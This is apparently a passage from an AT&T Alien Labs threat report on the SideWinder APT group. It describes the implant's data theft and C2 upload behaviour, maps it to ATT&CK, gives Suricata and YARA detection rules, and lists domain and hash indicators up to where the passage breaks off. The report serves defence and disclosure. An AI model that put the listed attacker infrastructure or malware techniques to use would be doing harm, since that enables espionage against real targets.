The implant will save its configuration file in the original malware folder and decrypt it in memory. Similar to the previous DLL, the first 32 bytes are the decryption key in XOR loop. A decrypted configuration used by the implant, which includes the configuration file name, malware directory, C2 server, file extensions to collect and more, can be seen in Figure 7: Figure 7: SideWinder Trojan Decrypted Configuration, captured via Alien Labs threat analysis. The full malware configuration parameters used are shown below in their declaration state. We can notice that in a switch statement if it does not have any C2, it will set one as default. Following execution, two timer functions are set. The first timer function is responsible for querying the C2 to get the new configuration needed for the malware and collect its associated information. After the first request, it will start processing the commands it received by following configuration settings:    Page 10 Figure 8: Sample of Configuration Settings, captured via Alien Labs threat analysis.

Page 11 A complete list of available capabilities with added context: 1. Collect system information, and save it to file to be later upload to the C2 server. Figure 9: System information collected, captured via Alien Labs threat analysis. Page 12 Figure 10: System information collected, captured via Alien Labs threat analysis. Page 13 2. Collect drive information and directory files based on configuration. The malware can list files based on extension. Figure 11: Drive and File Information, captured via Alien Labs threat analysis. Page 14 3. Collect files and save to a temporary file to later deliver to the C2 server. Figure 12: File Theft capability, captured via Alien Labs threat analysis. Page 15 4. Update malware configuration with one received from the C2 server. Figure 13: C2 Configuration Default Check, captured via Alien Labs threat analysis. The malware will collect information from the system, and save it as a JSON file on disk, and later will send it to the C2 server.

Figure 14: Json collected information file, captured via Alien Labs threat analysis. Page 16 The second callback function, is mainly responsible to upload files to the server, collected by the malware based on C2 configuration and request: Figure 15: Upload Files Function, captured via Alien Labs threat analysis. To send data to the server, the malware makes an HTTP POST request, as shown below: Figure 16: HTTP Post Request Configuration, captured via Alien Labs threat analysis. Page 17 SideWinder Relations and Shared Resources There are various links to other adversary groups observed during the investigation of SideWinder. AT&T Alien Labs assesses with moderate confidence there is a close relationship between the reported Indiainterest APT known as PatchWork and SideWinder. This relationship can be identified by an overlap in actor built C2 infrastructure. The October 2019 Android activity also presents an interesting anomaly for SideWinder introducing potential links to PatchWork attack techniques and infrastructure.

Additionally, SideWinder was observed using a shared weaponizer toolkit. This shared toolkit has been primarily referred to as the “Royal Road” or “8.t” Weaponizer. As noted in past reporting, many intriguing links can be made to the various APT groups' use of it, such as Goblin Panda, APT40, and ICEFOG (Chinese actors) and then later with SideWinder (potentially India). Such a shared exploit and weaponizer toolkit provides a limited insight into the supply chain used between many APTs. From an analyst opinion, this may mean the supply chain could be a central, for-profit organization, or there are potentially deliberate sharing efforts between various state-sponsored organizations. Royal Road samples include: 892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488 22062b6bcda194e3734285fed6b2de341c694c52a8f60c9f389f880cefab7644 9001056791a03ec998f26805d462bc2ca336b2c3aeac2e210f73ff841dfe3eec Lastly, the July 12, 2020, findings from the Shadow Chaser Group introduced a potential additional clue of links to a shared supply chain with the DarkHotel adversary group. Specifically, the unique variable declarations and specific parameters used in CVE-2020-0674 exploits are similar.

Conclusion After extensive investigation on the adversary group known as SideWinder, AT&T Alien Labs continues to observe the group remaining highly active. SideWinder is targeting government and businesses in Asia with use of phishing campaigns built for their specific targets. Through our investigation, we have uncovered a collection of activity targeting government and business spanning many years. Alien Labs assesses with low to medium confidence, the group is in support of India political interests based on targets, campaign timelines, technical characteristics of C2 infrastructure and malware, association with known India based APTs, in addition to past industry reporting and private telemetry. We express gratitude to the many organizations and researchers for their public sharing of SideWinder activity and recommend readers to make use of our Past Reporting Timeline in their own analysis and conclusions. Page 18
Appendix A. Mapped to ATT&CK Framework
TA0043: Reconnaissance
o T1589: Gather Victim Identity Information
T1589.002: Email Addresses
T1589.003: Employee Names
o T1591: Gather Victim Org Information
T1591.002: Business Relationships
T1591.001: Determine Physical Locations
T1591.003: Identify Business Tempo
T1591.004: Identify Roles
TA0042: Resource Development
o T1583: Acquire Infrastructure
T1583.001: Domains
T1583.004: Server
TA0001: Initial Access
o T1566.001: Spearphishing Attachment
o T1566.002: Spearphishing Link
TA0002: Execution
o T1059: Command and Scripting Interpreter
T1059.007: JavaScript/Jscript
T1059.001: PowerShell
T1059.005: Visual Basic
o T1203: Exploitation for Client Execution
o T1204: User Execution
T1204.002: Malicious File
T1204.001: Malicious Link
TA0003: Persistence
o T1574: Hijack Execution Flow
T1574.002: DLL Side-Loading
o T1078: Valid Accounts
TA0004: Privilege Escalation
o T1574: Hijack Execution Flow
T1574.002: DLL Side-Loading
TA0005: Defense Evasion
o T1574: Hijack Execution Flow
T1574.002: DLL Side-Loading
TA0007: Discovery
o T1087: Account Discovery
T1087.001: Local Account
o T1083: File and Directory Discovery
o T1120: Peripheral Device Discovery
o T1069: Permission Groups Discovery
o T1057: Process Discovery



Page 19
o T1518: Software Discovery
o T1082: System Information Discovery
o T1007: System Service Discovery
o T1124: System Time Discovery
TA0009: Collection
o T1119: Automated Collection
o T1602: Data from Configuration Repository
T1602.002: Network Device Configuration Dump
o T1005: Data from Local System
o T1039: Data from Network Shared Drive
o T1025: Data from Removable Media
o T1074: Data Staged
T1074.001: Local Data Staging
TA0011: Command and Control
o T1071: Application Layer Protocol
TA0010: Exfiltration
o T1020: Automated Exfiltration
o T1041: Exfiltration Over C2 Channel



Page 20
Appendix B.

Detection Methods
The following associated detection methods are in use by Alien Labs. They can be used by readers to tune or
deploy detections in their own environments or for aiding additional research. SURICATA IDS SIGNATURES
alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"AV TROJAN APT SideWinder
Malicious JS/Shellcode Inbound"; flow:established,to_client; content:"200";
http_stat_code; file_data; content:"<script language=|22|javascript|22|>";
startswith; content:".indexOf(str.charAt(i++)) << 18"; distance:0; within:300;
content:">> 16 & 255)"; distance:0; content:">> 8 & 255)"; distance:0;
http_content_type; content:"application/hta"; classtype:trojan-activity;
reference:md5,3f03cea9aafdee3e1f741d7585578d1c; sid:4002009; rev:1;)
YARA RULES
rule SideWinderRTF {
 meta:
 author = "AT&T Alien Labs"
 description = "Detects SideWinder RTF Files"
 reference = "https://otx.alienvault.com/pulse/5f21d5b84d529ed134127a66"
 strings:
 $s1 =
{4231304346313330354139373337464545333630353636383742443139424436333144393535453639
44463146453045314235373143434143463342373741433630434538314341463630303332354234443
131384336363441313543344637454637}
 $s2 =
{303036313030303130353030303030303030303030307D7B5C726573756C7420207D7D7B5C6F626A65
63745C6F626A}
 $s3 =
{4433433043373132394239423235374642394243414238363836463646394338454139424436453835
45333338463235313331433734344334423039414133464430434131444633433038413043463738393
0364537304531334543353846303933}
 condition:
 uint16(0) == 0x5c7b and all of them
}
rule SideWinder_loader_dll
{
 meta:
 author = "AT&T Alien Labs"
 description = "Detects SideWinder first dll loader"
 hash = "113c1c5e176cebe42e452e7ec6ded434c8f620372cef7ae7bfdc6b9469c1b3a4"
 reference = "https://otx.alienvault.com/pulse/5f21d5b84d529ed134127a66"
 strings:
 $code = {06 0A 06 8E 69 1F 20 59 8D (0E | 10) 00 00 01 0B 12 00 1F 20 12 01
07 8E 69 28 04 00 00 06 16 0C 2B 16 07 08 8F (0E | 10) 00 00 01 25 47 06 08 1F 20
5D 91 61 D2 52 08 17 58 0C 08 07 8E 69 32 E4 07 28 03 00 00 06 80 01 00 00 04 2A}
 //$tmp = {2E 00 74 00 6D 00 70 00 20 00 20 00 20 00 20 00 20 00}
 $tmp = ".tmp " wide
 condition:
 uint16(0) == 0x5A4D and all of them
}



Page 21
rule SideWinder_implant
{
 meta:
 author = "AT&T Alien Labs"
 description = "Detects SideWinder final payload"
 hash = "c568238dcf1e30d55a398579a4704ddb8196b685"
 reference = "https://otx.alienvault.com/pulse/5f21d5b84d529ed134127a66"
 strings:
 $code = {1B 30 05 00 C7 00 00 00 00 00 00 00 02 28 03 00 00 06 7D 12 00 00
04 02 02 FE 06 23 00 00 06 73 5B 00 00 0A 14 20 88 13 00 00 15 73 5C 00 00 0A 7D 13
00 00 04 02 02 FE 06 24 00 00 06 73 5B 00 00 0A 14 20 88 13 00 00 15 73 5C 00 00 0A
7D 15 00 00 04 02 7B 12 00 00 04 6F 0E 00 00 06 2C 1D 02 28 1F 00 00 06 02 7B 12 00
00 04 16 6F 0F 00 00 06 02 7B 12 00 00 04 6F 06 00 00 06 02 7B 12
 00 00 04 6F 10 00 00 06 2C 23 02 28 20 00 00 06 02 28 21 00 00 06
02 7B 12 00 00 04 16}
 $strings = {2E 00 73 00 69 00 66 00 00 09 2E 00 66 00 6C 00 63 00 00 1B 73
00 65 00 6C 00 65 00 63 00 74 00 65 00 64 00 46 00 69 00 6C 00 65 00 73}
 condition:
 uint16(0) == 0x5A4D and all of them
}



Page 22
Appendix C.

Associated Indicators (IOCs)
The associated IOCs are provided in the table below and are also available on OTX™:
https://otx.alienvault.com/pulse/5f21d5b84d529ed134127a66
Type Indicator Note TTP Possible Target
First Observed
Activity
Domain ntc-pk[.]net PK Gov November 2017
FileHash-SHA256
899b12d4e4391773a42a627e6bb800bb274469de837816141171322bbdfab7de LNK LNK to Remote Download
PK Gov
November 2017
FileHash-SHA256
01405597bf04496592b93a24a08fb9ed08159ab18b48c733b9d448a32e9e051a DLL
PK Gov
November 2017
domain srv-cdn[.]com PK Gov November 2017
FileHash-SHA256
152b406ad59b472186bf00c33825ffb0fb63c1324f36aa0f59df86cad57c667a Script - (HTA)
PK Gov
November 2017
Domain fb-dn[.]net PK Gov January 2018
Domain cdn-edge[.]net PK Gov April 2018
Domain ms-update-server[.]net PK Gov April 2018
Hostname google[.]com[.]d-dns[.]co PK Gov April 2018
FileHash-SHA256
08b9b5b7592004b8733544df1029e2fc085d82db1ba488a43830df49bbbc73b6
RTF - "Scholarship
Details.doc" CVE-2017-11882
PK Gov
April 2018
FileHash-SHA256
892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488
RTF - “2018 Bilateral
Training in China.doc” -
Royal Road v3 CVE-2017-11882
PK Gov
April 2018
FileHash-SHA256
778A862816F51590E7D7AE26451CABED22A8358BABC3C44E00B0372BD50C215C DLL
PK Gov
April 2018
FileHash-SHA256
6ba990e6b738195296552a419c28f75307168c1cc01e7ba694b99782c05de4e7 DLL
PK Gov
April 2018
FileHash-MD5 fe2d78d90cea90477776a36fd8e57deb DLL - Private PK Gov April 2018
FileHash-SHA256
94a9c88e878fa42d9bfebe838aab3a858d7c2f8606d534a569243ba38ee41f2d DLL
PK Gov
April 2018
FileHash-SHA256
22062b6bcda194e3734285fed6b2de341c694c52a8f60c9f389f880cefab7644
RTF - Uploaded in sept,
likely originated in april
- Royal Road v3 CVE-2017-11882
PK Gov
April 2018
FileHash-SHA256
ec558a2175deb1cb6c79a72a2b0b5a89f77b8a12a799f7e436dd04ae49b5799e
RTF - "Fund Allocation
Policy.doc" CVE-2017-11882
PK Gov
April 2018
FileHash-SHA256
b8cbdb36ccd666adaf2ba3628cc79578d3a05119c71dce1bb16aa39e56dea3cc HTA - "final.hta"
PK Gov
April 2018
FileHash-SHA256
8315956b587032db14ba4e700400dffeaeb4119ef509ecf0df1bb4e80a496b59 DLL
PK Gov
April 2018
FileHash-SHA256
13497aab3521abbaa654b51f375114e419b1bb774caa8c67cf52775095b17423 DLL
PK Gov
April 2018
Domain cdn-apn[.]net PK Gov April 2018



Page 23
Hostname nadra[.]gov[.]pk[.]d-dns[.]co PK Gov May 2018
FileHash-SHA256
b8a0ecbc61b2ad5700b8f4b920b6addb37e1d3b953915a7c7754b9718b6cff12
RTF - "CALS Renewal
procedure.doc" CVE-2017-11882
PK Gov
May 2018
Domain ap-cdn[.]net PK Gov May 2018
FileHash-SHA256 9001056791a03ec998f26805d462bc2ca336b2c3aeac2e210f73ff841dfe3eec
RTF - "main.rtf" - Royal
Road v3 CVE-2017-11882
Unknown
October 2018
Domain webserv-redir[.]net Unknown October 2018
FileHash-SHA256
35392341c9b2e731357b97c32c91310a63524345f4c3191fa04f83536fefde6c Script - (HTA)
Unknown
October 2018
FileHash-SHA256
98e21e6c4ba25a26bc9967f20804864629e25ac3280d0fad259e19fa43517b20 Script - (HTA)
Unknown
October 2018
FileHash-SHA256
8c16ebad57e0288077ae58607b2967bf7b40761b20d783814d655280e9779e99 PE
Unknown
October 2018
FileHash-SHA256
828c1bae13f1c91f0b448cc4b38c9ebe4ba5f7dd35ed2df65de2fec65edc25c6 DLL
Unknown
October 2018
domain cdn-src[.]net PK Gov October 2018
FileHash-SHA256
805263da772476ffac0486d10c1774dff7cbacbcf68e26e2b62d6c7534b10de8 DLL PK Gov October 2018
FileHash-SHA256
1ca25ffc4b20c3773777c5faea3e1505d55ff4fc601fa28835ae7bd7ba621256 RTF - "pmo.doc" CVE-2017-11882 PK Higher Education November 2018
Domain cdn-load[.]net PK Higher Education November 2018
domain s3-cdn[.]net PK Gov December 2018
FileHash-SHA256
7ef5250d5576abc7247e70e1478ce6580c9387107dee67c1c92bb9c40c2b5fc3 Script - (HTA) PK Gov December 2018
domain cdn-dir[.]net
Related to Oct cdn-load.net
activity PK Higher Education January 2019
FileHash-SHA256
04385479e70d851e39822b8ce729a3402966c84ec03807a72a585d58d029a34a DLL PK Higher Education January 2019
FileHash-SHA256
0030c333e91a803befacf80c27b04fbc7ae8218aa02056df599115cfaa732dc0 Script - (HTA) PK Higher Education January 2019
FileHash-SHA256
b3db16261a427468c87ecb61a1b063cf2d16238e02e43e348cf7dfd885920c17 Script - (HTA) PK Higher Education January 2019
FileHash-SHA256
dfb2b510b4013d749247b10f36560784bde8c6dba15d37298ae804f886f32a58 DLL PK Gov January 2019
domain cdn-list[.]net Unknown January 2019
FileHash-SHA256
bee62fab37071a8c0e58d7b360fd1a286db6951aeb3e200d93195a881b01b2fb Script - (HTA)
Unknown
January 2019
FileHash-SHA256
a99a821ce7367d5c3a506436d64fdbf4342ff078d17c48683658534264886ac8 Script - (HTA)
Unknown
January 2019
FileHash-SHA256
4418f829b17c79eea51170434b7343c2632f9c17eebde88150d162f3cdf4a42e Script - (HTA)
Unknown
January 2019
FileHash-SHA256
1b7cf8af4a008dd69e93033be3df2949f52cd4da7033a316f9cbe38e441e8aca DLL
Unknown
January 2019
FileHash-SHA256
2105f83123eb999a54f0182c298dc0ba65ff33460c7913e81e1e75725f1a6767 DLL
Unknown
January 2019



Page 24
FileHash-SHA256
d17cf7fbdb7adafc94a527bbbc2233cb028ec548c1b488de724e5fa79685938c DLL
Unknown
January 2019
FileHash-SHA256
bfeca94e9f639ca825c617962923d80127a3266f152e4e3942c48ca2ae7fa1b1 DLL
Unknown
January 2019
FileHash-SHA256
ca177e929202d46d5926660708139cad320ebf4a12930f3df957ac086bd28315 DLL
Unknown
January 2019
FileHash-SHA256
c58bd87b7cf530e39e48c3fe86b2c3004311dac1bdc5c117369cfbcf089ef5cf DLL
Unknown
January 2019
FileHash-SHA256
7b6ec46bc619de754be553970c8989af55d4195a443beac73c04bd3a99b0aca7 DLL
Unknown
January 2019
FileHash-SHA256
6193a395f8d0702efdc1ee1541bb4e29ef5063bb769f093ab75e4d8cd5dd7804 DLL
Unknown
January 2019
FileHash-SHA256
47e4f48f07e722950ed18f30035a9d83fe33d59bf1e0495cc14bb1be3efd13d0 DLL Unknown
January 2019
domain cdn-dl[.]cn
Many subdomains - various
campaigns/months PK Gov / CN others January 2019
FileHash-SHA256
0ad6474d721b9bd93ca9720fa0e3a03d9278b3ebe46e0821
3c2824db23f8ace9 RTF - "20191001cal.doc" CVE-2017-11882 PK Gov January 2019
FileHash-SHA256
70e9ffe2f025ae747d20849e85a64fe0aeb2198c0a8d0debe66a66a71a02f141
DLL - links to CN C2 transcan PK Gov
domain cdn-re[.]net PK Gov January 2019
FileHash-SHA256
4bdfb8ac58caf9df6c6eecff9f366f2f27f948670940514a86bbda594a3132ca Script - (HTA) PK Gov January 2019
FileHash-SHA256
ee3d356f51f98d78cef7603914e768b327c6e65292539259b6ff8fcad7b4600c Script - (HTA) PK Gov January 2019
FileHash-SHA256
80daf84616205653219dbac962634a75906d1a15d7e4f0507a35869a4dc091c0 DLL PK Gov January 2019
FileHash-SHA256
1b7cf8af4a008dd69e93033be3df2949f52cd4da7033a316f9cbe38e441e8aca DLL PK Gov January 2019
FileHash-SHA256
0cc10dd6f4b3aa0848ae08b6ec32e2b3e7136e4f5fc7762ecc4d44c837b6019d RTF CVE-2017-11882
Unknown
February 2019
domain cdn-do[.]net Unknown February 2019
FileHash-SHA256
0cc10dd6f4b3aa0848ae08b6ec32e2b3e7136e4f5fc7762ecc4d44c837b6019d RTF CVE-2017-11882
Unknown
February 2019
FileHash-SHA256
c208dc54cdec0339af316dacc108b1b8377661b9a2876f53d7e42af5864bd917 Script - (HTA)
Unknown
February 2019
domain cdn-io[.]net PK Gov February 2019
domain cv1-cdn[.]net PK Gov March 2019
domain cdn-bin[.]net PK Gov March 2019
FileHash-SHA256
e13c926b2011945a0aa90b4b5e85b17ea16debee64b870065d7ad3284bde27e0
RTF - "MoICalender2019.doc" CVE-2017-11882 PK Gov March 2019
FileHash-SHA256
d95c92bacaa3b730ebf7712e55a95d7153843d1cbf310928f56a6bb029c63c59
RTF - "nadra-calendar2019 -
Copy.doc" CVE-2017-11882 PK Gov March 2019
FileHash-SHA256
015dc215ffd87c2cf62f4445bc4ed22a1f8cbd2f1b7b1edab319036e2e04b5b8 DLL PK Gov March 2019



Page 25
FileHash-SHA256
1c1e3dc701a305653d098770b0c46929c2a211ec4ec54505c04a085366dbb4ce DLL PK Gov March 2019
FileHash-SHA256
03ec3575bf40aa594e3ed42b68d7db1f1aab96f2e7650dc06bba2c7b608bdd9c DLL PK Gov March 2019
FileHash-SHA256
6c8ecf19945fbc4756cd5b2d32af592a5d9a855e145b0d2731ea6faa1a9e1ade Script - (HTA) PK Gov March 2019
FileHash-SHA256
b8fa52f0f873cccaac88f9bcd6a6926e66a92f03adbbf21ec652e4fe4acbe0e8
RTF - "MoICalender2019.doc" CVE-2017-11882 PK Gov March 2019
domain cdn-port[.]net PK Gov April 2019
FileHash-SHA256
5e1ac5f28b37afc3b2a1902ee7c68485b3fcc55d648ff9e5309646a77ff53882 DLL PK Gov April 2019
domain cdn-in[.]net PK Gov April 2019
FileHash-SHA256 be71f2d17037a1a1fbbe8d7f3f4b45c72132a64224e3d3f13aa66a2249df9232
Phishing email for April PK
campaign PK Gov April 2019
FileHash-SHA256
ac4fd2681c3a9d087ff4cabb44b93753711e81c6574c837ca33f74fef37f3cf4
Docx - "STANDING OPERATING
PROCEDURES FOR POLICE
EMERGENCY THREAT LEVELS AND
COLOR CODES FOR OPERATIONAL
READINESS.docx" CVE-2017-11882 PK Gov April 2019
FileHash-SHA256
fa0e06f5b0499360f1ed3da1fe6ed565363544f8ed43029a513064d3a1ad27ba RTF - "main.rtf" CVE-2017-11882 PK Gov April 2019
FileHash-SHA256
39f8cf0d4badfbc69a016b02fb475035b0fa88688234a9c83c17265d9f56710a Script - (HTA) PK Gov April 2019
FileHash-SHA256
97865bbb0828efbf2800f068ffb5f3db6240cbf1a8031c5ac753490bb2bd28ea DLL PK Gov April 2019
FileHash-SHA256
db97a48939eaa50921ffe293084af77b173c2a1b05cd632e279165fc64cea718 DLL PK Gov April 2019
FileHash-SHA256
81df5952c95dc5ac7145f90b75cf9ba5c59445b098eff8c99c63262a4285e7d0 DLL PK Gov April 2019
FileHash-SHA256
f42aacea2a2fb59fb309e5dd5263cb4aa7c3f215e8f7154b1d8ae507c7aa77da DLL PK Gov April 2019
FileHash-SHA256
a8ca6d51653866e8cbf5f63df5ac8220f829b5a1ec31e561496ad1c47cfff244
DLL - Talks to older
domain.

Potentially older. PK Gov April 2019
domain cv1-cncdn[.]net PK Gov May 2019
domain ap1-trans[.]net PK Gov May 2019
domain del-pb[.]net PK Gov June 2019
FileHash-SHA256
6a7cc6d83b686c4e19a66a8d99847f9645cb1b4f687db49f6fcdbabb85d043b2 Script - (HTA) PK Gov June 2019
FileHash-SHA256
59e2b2acf9f2162e7b4eed8a3f9544be207e4773b3bfee3ccabd73763f2256b7 DLL PK Gov June 2019
FileHash-SHA256
7a42ddab754c8bd206c3984e6bdca1cd61f0b2dd4fac4c75e94276443a6a662b DLL PK Gov June 2019
domain trans-aws[.]net PK Gov June 2019
domain del-ivery[.]net PK Gov June 2019
FileHash-SHA256
b65f2cc9af10ee4d59660875a7bd82d3bb860c8c089f8a7d79f41394c54e5edb Script - (HTA) PK Gov June 2019



Page 26
FileHash-SHA256
d69d24991a49766702ca73ed08d1aa8f9e293b8fe6cb1d316ae6b304365433c4 Script - (HTA) PK Gov June 2019
FileHash-SHA256
8f749613521e25b6ba59739f798532507633b402a8bbcd21fe6cf4c95c6e61cc Script - (HTA) PK Gov June 2019
FileHash-SHA256 cb79da6635e0e29451e79fdada01a25b0a4d913d71ec9b954ae9719fdc00e174 Script - (HTA) PK Gov June 2019
FileHash-SHA256
224129ba3f9782d92d3fe3deec422348ce8a2d193f8b23a247cc8a78fe66aba4 Script - (HTA) PK Gov June 2019
FileHash-SHA256
92f9b4ebea8f3fcc65ff2e6b53eb9cc56f97dacfc4f360428c4e7311b0ace280 Script - (HTA) PK Gov June 2019
FileHash-SHA256
1becc433abee1fb2c682a51d587d7de24d33e48441ae18c72317c29ed53d5e73 DLL PK Gov June 2019
FileHash-SHA256
7b810ac05c0579071417d57d15865ba2966e4f9b6aa8f581938157158d6a8832 DLL PK Gov June 2019
FileHash-SHA256
268e74d0f87064dc857b010e4600a50bfb2778955cec4d33ccc7c8846fedc7dd DLL PK Gov June 2019
FileHash-SHA256
49bc168d6004d4a5b1de753f5fd3a98db31ae8dcb04fa0592097ec2b938607ce DLL PK Gov June 2019
FileHash-SHA256
9a5f7b67f804552bbc13644e4ad6db06303208ed8ee24859063979c799be6b16 DLL PK Gov June 2019
FileHash-SHA256
5252f8ee39b9d501ef0bd858f47d1089da55b5d155e40a268239fc956312d9f4 DLL PK Gov June 2019
FileHash-SHA256
3f1ff47ec9a531aef3307efe3b1ad50fa010880ea94188ea78b17715b46da46a DLL PK Gov June 2019
FileHash-SHA256
c177627eb2018345492e5ae43fbee4480e691fb7a241a49b26ec7f754e032895 DLL PK Gov June 2019
FileHash-SHA256
74caf33e062c32362de9893623868ffdb6b24cc3802f68cea643182bec073921 DLL PK Gov June 2019
FileHash-SHA256
39ddf6d6de5aae002da4517661b117d9635d879e3d97c1b370e67e4b9e1b5499 DLL PK Gov June 2019
FileHash-SHA256
cc8a8242cccf110dbf599274fbb7a29f0fb30ef08bfaff03b2718db40a3bd1c3 DLL PK Gov June 2019
FileHash-SHA256
9ec10829c371fd6118b263584f55344eafd0c443478f4592a6880348bd512d4d DLL PK Gov June 2019
FileHash-SHA256
9ff761dae8f2cfc9e00c9aef364100d39ec8e791c74a5759ecf2ebcc2b6a435b DLL PK Gov June 2019
FileHash-SHA256
713a28d568d4972a41f2c00eb6cecc5b4dbdf04f5415062855f1d8cabb121861 DLL PK Gov June 2019
FileHash-SHA256
91d93c03c9ec2667af44f34a751f8cb692285c954c6050015d66454733dd7b8c DLL PK Gov June 2019
FileHash-SHA256
b1509b118d553d8d18c683c83eabdbce083a6d4206787d6a278b7eda5658f86b DLL PK Gov June 2019
FileHash-SHA256
72af87036518a5da43f1ebe7d0b98ad5124a5a9cc398365b516ee49f4e476ee8 DLL PK Gov June 2019
domain cdn-fb[.]net PK Gov & CN Gov June 2019
domain trans-info[.]net PK Gov & CN Gov June 2019
FileHash-SHA256
a2cf704a4e794cddaedc0ab1e03b0015e7b87792cf914443e588877fa6308129 Script - (HTA) PK Gov & CN Gov June 2019



Page 27
FileHash-SHA256
200d7df3d44a07daf66f015e0e13d68f4b77e8cdc4e475e62de6e8d0bb47e1ee Script - (HTA) PK Gov & CN Gov June 2019
FileHash-SHA256
7151c15e9f2d897da2393081477e9cadafb28298c20a70c12c2fd5c0be8f9ab5 Script - (HTA) PK Gov & CN Gov June 2019
FileHash-SHA256
f488402e504a5ad527690c03fab9b93786837f324e8823315d18dbd325d8436d Script - (HTA) PK Gov & CN Gov June 2019
FileHash-SHA256
51a723fd25b6a85c2d6d6dd8fd8953bfdf5aa3d4a8ef413ceb7e7f8d43e1a112 Script - (HTA) PK Gov & CN Gov June 2019
FileHash-SHA256
174caf63e4ce052665ae5384e620d8a99e9454d5cd5015d5be28898c0c4ecebd DLL PK Gov & CN Gov June 2019
FileHash-SHA256
041a3c867a4d438be9783d88f99aa837da9d47487fe415c102f701c9918e1d7b DLL PK Gov & CN Gov July 2019
FileHash-SHA256
2a8c1b7fa343eb94428fa83da8c813b1c96caa2065de539e42a3f416bc15f3a4 DLL PK Gov & CN Gov June 2019
FileHash-SHA256
312e2f2f71cef6aff8e45134b6912fdb9a04348225ffccfce7b9875bb60e6323 DLL PK Gov & CN Gov June 2020
FileHash-SHA256
7b2d13ca2d4d1909b2b63546c9e1b05b65b3cfdb88722e850a1d8bb5584a20b1 DLL PK Gov & CN Gov June 2020
FileHash-SHA256
7b80bf96950c3be63e8ef035820e8b61ca73a11a33527f2cd904d110f4f5ef08 DLL PK Gov & CN Gov June 2020
FileHash-SHA256
8dcf0fcc44b4c0dbfa148a8a736f54055b639b179ee2c8002c46d3a934acca9c DLL PK Gov & CN Gov June 2020
FileHash-SHA256
afda067aee6aa9dcf6645710f890905ff936cda4249eaeab8b7116e53769f827 DLL PK Gov & CN Gov June 2020
FileHash-SHA256
b14abfbf5d149de8703357f959f4b2bd6e99125fd0641c840984bdc7f0d0b325 DLL PK Gov & CN Gov June 2020
FileHash-SHA256
e78fa6154d5310aeb540f96906451068b39299e6172edb47fe74c917074ba000 DLL PK Gov & CN Gov June 2020
FileHash-SHA256
f797c9697ac35aba9cc05703aeb3b35142349f9df7f8df00d36ae21a233d0f03 DLL PK Gov & CN Gov June 2020
Domain trans-can[.]net
Used in CN and PK older
campaign PK Gov & CN Gov June 2019
domain trans-pre[.]net PK Gov June 2019
FileHash-SHA256
dfff054adfb3c4f4dbc6ee4222683ff6229c954ed0057c373bbb1bc52c79f468 Script - (HTA) PK Gov June 2019
FileHash-SHA256
355BDFDF5DF6478B1EDAFA2A37B1DABD3E86831454774132B1338D536FD636BC DLL PK Gov June 2019
domain del-aws[.]net CN Gov July 2019
FileHash-SHA256
90aa7b90da08137826d216f4d61b6ef9f1d8f85c1e8cc526965b4b2510e1a82c
RTF - "Fax of Foreign
Affairs Office of Ministry
of National Defense" CVE-2017-11882 CN Gov July 2019
FileHash-SHA256
4743860DA4934BE1390984467FFE02A992EB1F4FCA2A78103F61A241D779D78D Script - (HTA) - "1.a" CN Gov July 2019
FileHash-MD5 A94BE8863E607DC7988F34F907309916 CN Gov July 2019
FileHash-SHA256
E38CEFE03F8FEC19F98CCE50C94A19938E709C1D084642B9BF4DA850C5F46A96 DLL CN Gov July 2019
FileHash-SHA256
9031118D7CC8B40B54828BD9CE7D43D3E5AF438AA24506BD07F34A5EC92BE83A .tmp CN Gov July 2019



Page 28
FileHash-SHA256
89899966ef870191df63c231098fe94f180520dc306a47097d1e7387bf20b6f2
RTF - "Fax of Foreign
Affairs Office of Ministry
of National Defense" CN Gov July 2019
FileHash-SHA256
FA32A70113FE2805A7AE1F01A20A4D30B2D7387FADF2EC7ADAE7A0A16519AEC8 DLL CN Gov July 2019
FileHash-SHA256
135281948FD68FADA5810E3824B5C6952BB32E547E4A16794A05556F087C40BB .tmp CN Gov July 2019
FileHash-SHA256
9654121ADBC9904D7596F1E4D6134065980277C73DDA81376DE762E6C4F596E5 Script - (HTA) - "1.a" CN Gov July 2019
FileHash-SHA256
2309fd453e48241ed2305239750437df1317a256f40b0078fc1ec64bf1c2cfda
RTF - "Fax of Foreign
Affairs Office of Ministry
of National Defense" CN Gov July 2020
domain cdn-ps[.]net PK Gov July 2019
FileHash-SHA256
a324235c05e4c9351192e6b6ab252b0ca85434fddc8d882fe44897f0fa6569a4
ZIP -"PassportchangeProfession.zip" PK Gov July 2019
FileHash-SHA256
54f1450decbcec6fa14380c13532e06fb6cf976c5fd07db5d4810636ba280b35
LNK -
"PassportchangeProfession.pdf.lnk" LNK to Remote Download PK Gov July 2019
FileHash-SHA256
863ddef1af72c82beae6456f407a88817c45c754fe86d09fcb3c558653620858 ZIP PK Gov July 2019
FileHash-SHA256
bedbad32669259305b66f2a5b97c2facc6755a0f314fa116b244e1a877306d80
LNK -
"PassportchangeProfession.pdf.lnk" LNK to Remote Download PK Gov July 2019
FileHash-SHA256
f89504b4a7736f2123ac8d4b9ecaf25aa869906b5d618bd2758ef8ad14c8bbba Script - (HTA) PK Gov July 2019
FileHash-SHA256
b92e86c193dde2f8fad7de2d6be7b2aba5e55f294c3862307484f12d09102403 DLL PK Gov July 2019
FileHash-SHA256
c679b8ac687d2d55a0bb7ef03432d0eff09d4bcab9de5fdc37d55d5f59e6c1d5 Script - (HTA) PK Gov July 2019
FileHash-SHA256
121648be6641269d626d4d2ad79d234c99b121e0e0588909c05ba870308d9bc9
Docx - "SOP CHINESE SECURITY.docx" CVE-2017-11882 PK Gov August 2019
FileHash-SHA256
307665150f275e2346005a97eb621f6fc8f04ef95f9cd2ef930acb65409c383b
RTF - Poly Technologies
Lure CVE-2017-11882 CN Def Tech August 2019
FileHash-SHA256
be823e05b874256b85f58e95f29d26de84fc781a897e202f7e9084cc5fdceaf2 Script - (HTA) - "1.a" CN Def Tech August 2019
FileHash-MD5 8FD10BD711AB374E8DE9841CF8824758 Private - Script (HTA) CN Def Tech August 2019
FileHash-MD5 D4C3963B11E1732E1419ADF5F404E50C Private CN Def Tech August 2019
FileHash-SHA256
3F129C5B8F73852FAC0295B17932B88278FE8F66B753F94C2206BC06CDC48088 DLL CN Def Tech August 2019
FileHash-SHA256
082EB89174DEE12BB60ADB1F9AECEA0012CAAE87603B47F381C043E8E8F2D013 .tmp CN Def Tech August 2019
domain aws-check[.]net Unknown September 2019
domain ap1-cdnfb[.]net CN October 2019
FileHash-SHA256
